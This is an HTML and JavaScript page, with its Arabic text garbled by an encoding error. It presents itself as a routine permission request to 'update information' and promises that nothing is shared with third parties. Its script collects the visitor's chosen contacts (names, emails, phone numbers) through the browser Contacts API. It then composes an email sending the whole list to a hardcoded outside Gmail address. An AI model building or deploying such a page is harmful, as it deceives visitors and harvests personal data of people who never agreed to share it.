<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .header {
            margin-bottom: 30px;
        }
        .header h1 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 2rem;
        }
        .header p {
            color: #7f8c8d;
            font-size: 1.1rem;
        }
        .icon {
            font-size: 4rem;
            margin-bottom: 20px;
            color: #3498db;
        }
        .permission-box {
            background: #f8f9fa;
            border: 2px dashed #dee2e6;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        .permission-box h3 {
            color: #2c3e50;
            margin-bottom: 15px;
        }
        .btn {
            background: linear-gradient(45deg, #3498db, #2980b9);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px;
            min-width: 200px;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
        }
        .btn:active {
            transform: translateY(-1px);
        }
        .btn-success {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
        }
        .btn-danger {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: block;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
            display: block;
        }
        .contacts-list {
            max-height: 200px;
            overflow-y: auto;
            text-align: right;
            margin: 15px 0;
            padding: 15px;
            background: white;
            border-radius: 10px;
            border: 1px solid #dee2e6;
            display: none;
        }
        .contact-item {
            padding: 8px;
            border-bottom: 1px solid #eee;
        }
        .contact-item:last-child {
            border-bottom: none;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 25px;
            color: #7f8c8d;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">ğŸ“±</div>
            <h1>Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</h1>
            <p>Ù†Ø­ØªØ§Ø¬ Ø¥Ù„Ù‰ Ø¥Ø°Ù†Ùƒ Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</p>
        </div>

        <div class="permission-box">
            <h3>ğŸ” Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†</h3>
            <p>Ø³ÙŠØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ Ø¨Ø´ÙƒÙ„ Ø¢Ù…Ù† ÙˆØ³ÙŠØªÙ… Ø­Ù…Ø§ÙŠØ© Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ</p>
        </div>

        <div class="status info" id="infoStatus">
            âš ï¸ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ø£Ø¯Ù†Ø§Ù‡ Ù„Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        </div>

        <div class="status success" id="successStatus">
            âœ… ØªÙ… Ø¬Ù…Ø¹ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù†Ø¬Ø§Ø­ ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§
        </div>

        <div class="status error" id="errorStatus">
            âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        </div>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§...</p>
        </div>

        <div class="contacts-list" id="contactsList">
            <!-- Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø³ØªØ¸Ù‡Ø± Ù‡Ù†Ø§ -->
        </div>

        <button class="btn" onclick="requestContacts()" id="requestBtn">
            Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        </button>

        <button class="btn btn-success" onclick="sendContacts()" id="sendBtn" style="display: none;">
            Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        </button>

        <div class="footer">
            <p>Ù†Ø­Ù† Ù†Ø­ØªØ±Ù… Ø®ØµÙˆØµÙŠØªÙƒ. Ù„Ù† ÙŠØªÙ… Ù…Ø´Ø§Ø±ÙƒØ© Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ù…Ø¹ Ø£ÙŠ Ø·Ø±Ù Ø«Ø§Ù„Ø«.</p>
        </div>
    </div>

    <script>
        let contactsData = [];

        // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        async function requestContacts() {
            const infoStatus = document.getElementById('infoStatus');
            const errorStatus = document.getElementById('errorStatus');
            const loading = document.getElementById('loading');
            const requestBtn = document.getElementById('requestBtn');
            const sendBtn = document.getElementById('sendBtn');
            const contactsList = document.getElementById('contactsList');

            try {
                // Ø¥Ø¸Ù‡Ø§Ø± Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
                loading.style.display = 'block';
                infoStatus.style.display = 'none';
                errorStatus.style.display = 'none';
                requestBtn.disabled = true;

                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¯Ø¹Ù… ÙˆØ§Ø¬Ù‡Ø© Contacts API
                if (!('contacts' in navigator)) {
                    throw new Error('ÙˆØ§Ø¬Ù‡Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…Ø© ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­');
                }

                // Ø·Ù„Ø¨ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª
                const props = ['name', 'email', 'tel'];
                const opts = { multiple: true };

                const contacts = await navigator.contacts.select(props, opts);
                
                if (contacts.length === 0) {
                    throw new Error('Ù„Ù… ÙŠØªÙ… Ø§Ø®ØªÙŠØ§Ø± Ø£ÙŠ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„');
                }

                // Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                contactsData = contacts;
                
                // Ø¹Ø±Ø¶ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
                displayContacts(contacts);
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø£Ø²Ø±Ø§Ø±
                sendBtn.style.display = 'inline-block';
                contactsList.style.display = 'block';
                
                // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„
                loading.style.display = 'none';
                
                console.log('ØªÙ… Ø¬Ù…Ø¹ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„:', contacts);

            } catch (error) {
                console.error('Error accessing contacts:', error);
                loading.style.display = 'none';
                errorStatus.style.display = 'block';
                errorStatus.innerHTML = `âŒ ${error.message}`;
                requestBtn.disabled = false;
            }
        }

        // Ø¹Ø±Ø¶ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        function displayContacts(contacts) {
            const contactsList = document.getElementById('contactsList');
            contactsList.innerHTML = '';

            contacts.forEach((contact, index) => {
                const contactDiv = document.createElement('div');
                contactDiv.className = 'contact-item';
                
                let contactInfo = `ğŸ‘¤ ${contact.name || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø§Ø³Ù…'}`;
                
                if (contact.email && contact.email.length > 0) {
                    contactInfo += ` | ğŸ“§ ${contact.email[0]}`;
                }
                
                if (contact.tel && contact.tel.length > 0) {
                    contactInfo += ` | ğŸ“ ${contact.tel[0]}`;
                }
                
                contactDiv.textContent = contactInfo;
                contactsList.appendChild(contactDiv);
            });
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
        async function sendContacts() {
            const loading = document.getElementById('loading');
            const successStatus = document.getElementById('successStatus');
            const errorStatus = document.getElementById('errorStatus');
            const sendBtn = document.getElementById('sendBtn');

            try {
                loading.style.display = 'block';
                sendBtn.disabled = true;

                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ù†Øµ
                const contactsText = formatContactsToText(contactsData);
                
                // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ù†ØµÙŠ
                const blob = new Blob([contactsText], { type: 'text/plain' });
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… mailto
                const subject = 'Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©';
                const body = `ØªÙ… Ø¬Ù…Ø¹ ${contactsData.length} Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„.\n\n${contactsText}`;
                const mailtoLink = `mailto:asd.asd.net.sy@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
                
                // ÙØªØ­ Ø¹Ù…ÙŠÙ„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
                window.location.href = mailtoLink;
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø­Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
                loading.style.display = 'none';
                successStatus.style.display = 'block';
                
                console.log('ØªÙ… Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ù„Ù„Ø¥Ø±Ø³Ø§Ù„');

            } catch (error) {
                console.error('Error sending contacts:', error);
                loading.style.display = 'none';
                errorStatus.style.display = 'block';
                errorStatus.innerHTML = `âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${error.message}`;
                sendBtn.disabled = false;
            }
        }

        // ØªÙ†Ø³ÙŠÙ‚ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ÙƒÙ†Øµ
        function formatContactsToText(contacts) {
            let text = `Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©\n`;
            text += `Ø§Ù„ØªØ§Ø±ÙŠØ®: ${new Date().toLocaleString('ar-SA')}\n`;
            text += `Ø§Ù„Ø¹Ø¯Ø¯: ${contacts.length} Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„\n\n`;
            text += '='.repeat(50) + '\n\n';

            contacts.forEach((contact, index) => {
                text += `Ø¬Ù‡Ø© Ø§Ù„Ø§ØªØµØ§Ù„ ${index + 1}:\n`;
                text += `Ø§Ù„Ø§Ø³Ù…: ${contact.name || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}\n`;
                
                if (contact.email && contact.email.length > 0) {
                    text += `Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: ${contact.email.join(', ')}\n`;
                }
                
                if (contact.tel && contact.tel.length > 0) {
                    text += `Ø§Ù„Ù‡Ø§ØªÙ: ${contact.tel.join(', ')}\n`;
                }
                
                text += '-'.repeat(30) + '\n';
            });

            return text;
        }

        // Ø¨Ø¯ÙŠÙ„ Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† ÙˆØ§Ø¬Ù‡Ø© Contacts API Ù…Ø¯Ø¹ÙˆÙ…Ø©
        function showAlternativeMethod() {
            const errorStatus = document.getElementById('errorStatus');
            errorStatus.style.display = 'block';
            errorStatus.innerHTML = `
                âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„.<br>
                ğŸ’¡ Ø§Ù„Ø­Ù„ÙˆÙ„ Ø§Ù„Ø¨Ø¯ÙŠÙ„Ø©:<br>
                1. ØªØµØ¯ÙŠØ± Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ÙŠØ¯ÙˆÙŠØ§Ù‹ ÙƒÙ…Ù„Ù vCard<br>
                2. Ø§Ø³ØªØ®Ø¯Ø§Ù… ØªØ·Ø¨ÙŠÙ‚ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ù…Ø²Ø§Ù…Ù† Ù…Ø¹ Ø§Ù„Ø³Ø­Ø§Ø¨Ø©<br>
                3. Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ Ù…Ø®ØªÙ„Ù ÙŠØ¯Ø¹Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©
            `;
        }

        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­ Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        document.addEventListener('DOMContentLoaded', function() {
            if (!('contacts' in navigator)) {
                document.getElementById('infoStatus').innerHTML = `
                    âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ø§Ù„Ø­Ø§Ù„ÙŠ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ø¥Ù„Ù‰ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„.<br>
                    Ø¬Ø±Ø¨ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ Chrome Ø¹Ù„Ù‰ Android.
                `;
            }
        });
    </script>
</body>
</html>